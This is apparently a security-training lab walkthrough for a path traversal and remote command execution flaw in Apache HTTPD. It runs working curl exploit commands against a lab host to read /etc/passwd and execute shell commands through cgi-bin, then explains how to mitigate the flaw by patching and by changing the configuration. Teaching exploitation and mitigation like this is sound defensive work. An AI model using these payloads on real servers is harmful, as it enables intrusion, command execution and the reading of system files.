#### Exploitation Lab Instructions

1. After launching the lab on the CyDefe platform, you can choose to work in either the VNC or terminal environment. If utilizing the VNC environment, click the Xterm icon twice to open a terminal window. **Note: If you choose to utilize the terminal environment, you have the ability to copy and paste text between the terminal and your local environment.**
    
2. Use the **`curl`** command to attempt a path traversal attack:
    

**`curl -v --path-as-is http://www.target.co/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd`**

![Apache HTTPD Image 1.2.1 Path Traversal](https://images.ctfassets.net/kvf8rpi09wgk/7eHYT4xyz4Wwp6MAOs8rT1/29ad6f9ed93b7b8ff10630b84d776979/Apache_HTTPD_Image_1.2.1_Path_Traversal.png)

Image 1.2.1 - Checking for path traversal

3. After confirming that the target is vulnerable to the path traversal attack, you can now use this attack vector to read files on the target server.
    
4. Verify whether the target is vulnerable to arbitrary command execution by once again utilizing the **`curl`** tool. Run the command below and **ensure your syntax is**: **`echo;command`** (i.e. **`echo;ls /home`**). **Note**: In the image below, we utilized the command, **`whoami`**, but as an (ethical!) attacker, you can now enter any desired Linux command to interact with the target machine.
    

```
curl -v --data "echo;whoami" 'http://www.target.co/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'
```

![Apache HTTPD Image 1.2.2 Checking Files](https://images.ctfassets.net/kvf8rpi09wgk/2fhi2AAZ1PLJBBs7MruO58/e647f1ffe8cad91be0b297bd3c27b748/Apache_HTTPD_Image_1.2.2_Checking_Files.png)

Image 1.2.2 - Checking the files

5. By running this command, you can confirm that the target is vulnerable to arbitrary code execution. You can now use this attack vector to execute commands on the target host. It's evident that adversaries can quickly execute this attack to gain access to a system and essentially have free reign over the environment. **Keep the VM open to mitigate the vulnerability in the section below and to answer the challenge questions at the end of the page**.

#### Mitigation Overview

Your best options to mitigate this vulnerability are to patch the flaw through official sources and to make changes to the configuration file. See instructions for both options below. **You can modify the configuration file for option 2 in the lab VM, but you cannot try out the option 1 patching method in the lab**.

#### Option 1: Patching (No Lab)

1. Update the **`apt`** repository using the command, **`apt update`**. Or, if you are not **`root`**, then enter the command: **`sudo apt update`**.

![Apache HTTPD Image 1.2.3](https://images.ctfassets.net/kvf8rpi09wgk/1mRPAUAqyNIRHBHUtnSrkV/39db394254935da42491da9c77e23b00/Apache_HTTPD_Image_1.2.3.png)

Image 1.2.3 - Executing the apt update from the root folder

2. Install the latest version of Apache using the command, **`sudo apt install apache2`**. When prompted select **`y`** to install the package.

![Apache HTTPD Image 1.2.4](https://images.ctfassets.net/kvf8rpi09wgk/4M6gjY8bd0ipE40Dy5UmWh/af357a6fa5addab13273c284ab371b84/Apache_HTTPD_Image_1.2.4.png)

Image 1.2.4 - Installing the package update

#### Option 2: Configuration File Changes (Lab)

1. Keep the lab VM open from the exploitation section of this lesson to make configuration file changes in the lab. In the terminal, SSH into the target host by entering: **`ssh admin@www.target.co`**. When prompted to enter a password, enter the very secure password: **`password`**.

![Apache HTTPD Image 1.2.5 - SSH](https://images.ctfassets.net/kvf8rpi09wgk/2xqWYoPjeZh58Ifo0Aospf/e28bdb6fab20ff1ac1489058c551867a/Apache_HTTPD_Image_1.2.5_-_SSH.png)

Image 1.2.5 - SSH into the target host

2. Open the configuration file using the **`vi`** command:

```
vi /usr/local/apache2/conf/httpd.conf
```

![Apache HTTPD Image 1.2.6 - vi](https://images.ctfassets.net/kvf8rpi09wgk/2SvzSyHQP9wlRyfLZ45Bgi/392e85fc8f4ea9cc3ad4c3834409caa0/Apache_HTTPD_Image_1.2.6_-_vi.png)

Image 1.2.6 - Using the ‘vi’ command

3. Edit the lines containing the misconfigurations. Select **`i`** to allow editing of the file. Use the **`#`** symbol to branch out the lines containing **`LoadModule cgid_module modules/mod_cgid.so`** and the surrounding **`if module`** lines.

![Apache HTTPD Image 1.2.7](https://images.ctfassets.net/kvf8rpi09wgk/1uGI7kJDNWFS2nCKCwhpcs/32b2d4fd9ee0e678da8aba252dc688cc/Apache_HTTPD_Image_1.2.7.png)

Image 1.2.7 - How the lines should look

4. Review the following section:

```
<Directory /> 
AllowOverride none
Require all granted 
</Directory>
```

5. Change that section above to read:

```
<Directory /> 
AllowOverride none
Require all denied 
</Directory>
``
```

![Revised section](https://images.ctfassets.net/kvf8rpi09wgk/2yUHI6Uama6DRlSSke5Smp/930008c8f2e792614f1778afece130c6/Apache_HTTPD_Image_1.2.8.png)

Image 1.2.8 - Revised section

6. Enter **`:wq!`** to save the file.
    
7. Restart the Apache HTTPD service using the command below in order for the configuration file changes to take effect:
    

```
sudo /usr/local/apache2/bin/apachectl -k restart
```

![Apache HTTPD Image 1.2.9 - Restat](https://images.ctfassets.net/kvf8rpi09wgk/1Gd7pT9w9DALnFmj3IKL7N/aee1b9d38bff629da97c672fe45615d4/Apache_HTTPD_Image_1.2.9_-_Restat.png)

Image 1.2.9 - Restart

8. Reattempt the exploit using either the path traversal attack or arbitrary command injection attack.

![Apache HTTPD Image 1.2.2 Checking Files](https://images.ctfassets.net/kvf8rpi09wgk/2fhi2AAZ1PLJBBs7MruO58/e647f1ffe8cad91be0b297bd3c27b748/Apache_HTTPD_Image_1.2.2_Checking_Files.png)

Image 1.2.10 - Here we go again